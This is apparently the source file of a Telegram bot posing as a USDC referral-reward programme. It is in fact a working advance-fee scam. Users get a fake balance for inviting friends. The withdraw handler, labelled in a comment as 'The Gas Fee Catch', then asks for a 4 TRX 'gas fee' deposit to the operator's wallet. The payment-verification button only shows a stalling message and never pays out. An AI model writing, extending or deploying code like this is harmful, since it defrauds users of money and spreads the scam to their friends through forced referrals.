import { Bot } from "grammy";
import { autoRetry } from "@grammyjs/auto-retry";
import { BotContext, CONFIG, Env } from "./types";
import { forceJoinMiddleware } from "./middlewares/forceJoin";
import { createUser, getUser, addReferral, getReferralCount } from "./db/queries";

export function createBot(env: Env) {
  const bot = new Bot<BotContext>(env.BOT_TOKEN);
  
  // Inject env to context
  bot.use(async (ctx, next) => {
    ctx.env = env;
    await next();
  });

  // Setup Plugins & Middleware
  bot.api.config.use(autoRetry());
  bot.use(forceJoinMiddleware);

  // Helper function to generate dashboard
  async function sendDashboard(ctx: BotContext) {
    const userId = ctx.from!.id;
    await createUser(ctx.env, userId, ctx.from?.username);
    
    const inviteCount = await getReferralCount(ctx.env, userId);
    const hasReachedGoal = inviteCount >= CONFIG.REQUIRED_REFERRALS;
    const balance = hasReachedGoal ? CONFIG.REWARD_USDC : 0.00;
    const needed = Math.max(0, CONFIG.REQUIRED_REFERRALS - inviteCount);

    let message = `📊 *Referral Lite Dashboard*\n\n`;
    message += `💰 *Accumulated Balance:* \`${balance.toFixed(4)} USDC\`\n`;
    
    if (!hasReachedGoal) {
      message += `🎯 *Progress:* \`${inviteCount}/${CONFIG.REQUIRED_REFERRALS}\` Friends Invited\n`;
      message += `⚡ Invite *${needed}* more friends to unlock **${CONFIG.REWARD_USDC} USDC**!\n`;
    } else {
      message += `✅ *Milestone Unlocked!* You are eligible for withdrawal.\n`;
    }

    await ctx.reply(message, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔗 Invite Friends (Get Link)", callback_data: "get_link" }],
          [{ text: "💸 Withdraw Balance", callback_data: "trigger_withdraw" }]
        ]
      }
    });
  }

  // Handle Verify Membership Callback
  bot.callbackQuery("check_membership", async (ctx) => {
    const userId = ctx.from.id;
    try {
      const member = await ctx.api.getChatMember(CONFIG.CHANNEL_ID, userId);
      const isMember = ["member", "administrator", "creator"].includes(member.status);

      if (isMember) {
        await ctx.answerCallbackQuery({ text: "✅ Verified! Welcome aboard." });
        await ctx.editMessageText("🎉 *Verification Successful!*\n\nGenerating your dashboard...", { parse_mode: "Markdown" });
        await sendDashboard(ctx);
      } else {
        await ctx.answerCallbackQuery({ text: "❌ You haven't joined the channel yet!", show_alert: true });
      }
    } catch (e) {
      await ctx.answerCallbackQuery({ text: "Error verifying status. Please try again." });
    }
  });

  // Start Command & Referral Tracking
  bot.command("start", async (ctx) => {
    const userId = ctx.from!.id;
    const payload = ctx.match; // The text after /start
    
    await createUser(ctx.env, userId, ctx.from?.username);

    // If there is a referral payload (e.g. /start ref_12345)
    if (payload && payload.startsWith("ref_")) {
      const referrerId = parseInt(payload.split("_")[1]);
      
      // Ensure user doesn't refer themselves
      if (referrerId && referrerId !== userId) {
        const success = await addReferral(ctx.env, referrerId, userId);
        if (success) {
          // Send notification to the referrer
          try {
             const newCount = await getReferralCount(ctx.env, referrerId);
             let notif = `🎉 *New Referral!*\nSomeone joined using your link. You now have \`${newCount}\` referrals.`;
             if(newCount === CONFIG.REQUIRED_REFERRALS) notif += `\n\n✅ *Milestone Reached!* You can now withdraw ${CONFIG.REWARD_USDC} USDC!`;
             await bot.api.sendMessage(referrerId, notif, { parse_mode: "Markdown" });
          } catch(e) {
             console.error("Could not notify referrer");
          }
        }
      }
    }

    await sendDashboard(ctx);
  });

  // Generate Referral Link
  bot.callbackQuery("get_link", async (ctx) => {
    const userId = ctx.from.id;
    const link = `https://t.me/${ctx.me.username}?start=ref_${userId}`;
    await ctx.reply(`🎁 *Your Unique Invite Link:*\n\n\`${link}\`\n\nShare this link to complete your task!`, {
      parse_mode: "Markdown"
    });
    await ctx.answerCallbackQuery();
  });

  // Withdraw Logic (The Gas Fee Catch)
  bot.callbackQuery("trigger_withdraw", async (ctx) => {
    const userId = ctx.from.id;
    const inviteCount = await getReferralCount(ctx.env, userId);
    
    if (inviteCount < CONFIG.REQUIRED_REFERRALS) {
      await ctx.answerCallbackQuery({
        text: `❌ You need ${CONFIG.REQUIRED_REFERRALS} referrals to withdraw. You have ${inviteCount}.`,
        show_alert: true
      });
      return;
    }

    let withdrawText = `💸 *Secure Smart Contract Withdrawal*\n\n`;
    withdrawText += `USDC Ready to Transfer: \`${CONFIG.REWARD_USDC.toFixed(4)} USDC\`\n`;
    withdrawText += `⚠️ *Network Gas Fee Required:* \`${CONFIG.GAS_FEE_TRX.toFixed(4)} TRX\`\n\n`;
    withdrawText += `To cover blockchain network costs for this transaction, please deposit exactly *4 TRX* to the address below:\n\n`;
    withdrawText += `\`${CONFIG.TRX_WALLET}\`\n\n`;
    withdrawText += `_Your USDC will be sent automatically after the TRX network confirmation._`;

    await ctx.editMessageText(withdrawText, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ I Have Deposited (Verify)", callback_data: "verify_payment" }],
          [{ text: "🔙 Dashboard", callback_data: "back_home" }]
        ]
      }
    });
  });

  bot.callbackQuery("verify_payment", async (ctx) => {
    await ctx.answerCallbackQuery({
      text: "⏳ Awaiting network confirmation. This usually takes 2-5 minutes. We will notify you once confirmed.",
      show_alert: true
    });
  });

  bot.callbackQuery("back_home", async (ctx) => {
    await ctx.deleteMessage();
    await sendDashboard(ctx);
  });

  return bot;
}
